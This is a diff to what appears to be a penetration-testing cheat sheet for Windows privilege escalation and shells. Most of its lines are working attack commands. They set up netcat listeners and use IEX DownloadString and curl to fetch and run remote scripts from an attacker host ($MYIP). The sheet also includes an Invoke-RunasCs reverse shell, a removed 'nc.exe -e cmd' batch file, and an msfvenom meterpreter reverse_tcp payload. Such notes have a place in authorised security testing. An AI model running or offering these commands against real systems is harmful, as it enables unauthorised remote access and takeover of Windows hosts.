@@ -1191,12 +1191,14 @@ powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
++---------- Switch User ----------+
+rlwrap nc -lvnp 5566
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
+
 +---------- Shell From File ----------+
 rlwrap nc -lvnp 5555
 curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
-cmd /c "(echo @echo off & echo C:\ProgramaData\nc.exe -e cmd $MYIP 5555 & echo PAUSE & echo exit) > x.bat"
-bat2exe.bat > x.bat > x.exe > C:\programdata\x.exe
-C:\programdata\x.exe
+powershell -c "\programdata\bat2exe.bat $MYIP 5555; \programdata\x.exe"
 
 +---------- Shell From Memory ----------+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
